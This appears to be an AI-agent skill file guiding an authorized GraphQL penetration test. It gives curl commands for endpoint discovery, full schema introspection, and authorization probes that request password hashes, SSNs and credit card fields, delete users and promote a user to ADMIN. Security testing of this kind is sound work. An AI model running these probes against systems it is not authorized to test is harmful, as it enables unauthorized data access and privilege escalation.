---
name: performing-graphql-security-assessment
description: "Assess GraphQL API endpoints for introspection leaks and injection attacks. Signals: api attack, interface testing, graphql."
zh-signals: "Assessing GraphQL API endpoints for introspection leaks, injection attacks 信号:api攻击,接口测试,graphql。"
when-to-use: Assessing GraphQL API endpoints for introspection leaks, injection attacks,
  authorization flaws, and denial-of-service vulnerabilities during authorized security
  tests.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- graphql
- api-security
- owasp
- web-security
- introspection
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1055
---

# Performing GraphQL Security Assessment

## When to Use

- During authorized penetration tests when the target application uses a GraphQL API
- When assessing single-page applications (React, Vue, Angular) that communicate via GraphQL
- For evaluating mobile app backends that expose GraphQL endpoints
- When testing microservice architectures with a GraphQL gateway or federation
- During bug bounty programs targeting GraphQL-based APIs

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: With InQL extension for GraphQL scanning
- **GraphQL Voyager**: Schema visualization tool
- **InQL Scanner**: Burp extension for GraphQL introspection and query generation
- **Altair GraphQL Client**: Desktop GraphQL client for interactive testing
- **clairvoyance**: GraphQL schema enumeration when introspection is disabled
- **curl**: For manual GraphQL query submission

## Workflow

### Step 1: Discover and Fingerprint GraphQL Endpoints

Locate GraphQL endpoints and confirm GraphQL is running.

```bash
# Common GraphQL endpoint paths
for path in graphql graphiql playground query gql api/graphql \
  v1/graphql v2/graphql graphql/console; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    "https://target.example.com/$path")
  echo "$path: $status"
done

# Check for GraphQL IDEs (GraphiQL, Playground)
curl -s "https://target.example.com/graphiql" | grep -i "graphiql"
curl -s "https://target.example.com/graphql/playground" | grep -i "playground"

# Fingerprint GraphQL engine
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' \
  "https://target.example.com/graphql"
# Response varies by engine: Apollo returns "Query", Hasura returns "query_root"

# Check for WebSocket GraphQL subscriptions
# ws://target.example.com/graphql (or wss://)
```

### Step 2: Perform Schema Introspection

Extract the full GraphQL schema to understand the API surface.

```bash
# Full introspection query
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } mutationType { fields { name } } queryType { fields { name } } subscriptionType { fields { name } } } }"}' \
  "https://target.example.com/graphql" | jq .

# Comprehensive introspection query
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' \
  "https://target.example.com/graphql" | jq . > schema.json

# If introspection is disabled, use clairvoyance for schema enumeration
python3 -m clairvoyance \
  -u "https://target.example.com/graphql" \
  -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt \
  -o discovered-schema.json

# Visualize the schema using GraphQL Voyager
# Upload schema.json to https://graphql-kit.com/graphql-voyager/
```

### Step 3: Test Authorization on Queries and Mutations

Verify that access control is enforced at the field and object level.

```bash
# Test querying all users (should require admin)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"{ users { id email role passwordHash } }"}' \
  "https://target.example.com/graphql" | jq .

# Test accessing sensitive fields on own user
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"{ user(id: 1) { id email ssn creditCard internalNotes } }"}' \
  "https://target.example.com/graphql" | jq .

# Test mutation authorization (admin-only actions with user token)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"mutation { deleteUser(id: 2) { success } }"}' \
  "https://target.example.com/graphql" | jq .

curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"mutation { updateUserRole(userId: 1, role: ADMIN) { id role } }"}' \
  "https://target.example.com/graphql" | jq .

# Test without any authentication
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email } }"}' \
  "https://target.example.com/graphql" | jq .
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
